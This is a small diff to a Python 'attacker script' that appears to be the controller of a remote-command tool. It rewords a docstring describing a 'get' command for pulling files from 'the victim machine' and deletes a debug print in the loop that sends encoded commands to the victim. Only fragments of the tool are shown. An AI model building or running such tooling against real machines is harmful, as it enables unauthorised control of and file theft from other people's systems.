@@ -1,7 +1,7 @@
 # attacker script
 
 """
-I added 2 custom commands in this script
+There are 2 custom commands in this script
 
 1. The get command:
 If you want to transfer any file from the victim machine you can use the get command.
@@ -98,8 +98,7 @@ def main(host: str, port: int) -> None:
 		elif command.startswith("chbuff "):
 			chg_buff(command)
 			continue
-		print(f"{buffer = }")
-
+		
 		# encoding the command and sending to the victim machine
 		victim.send(command.encode())
 
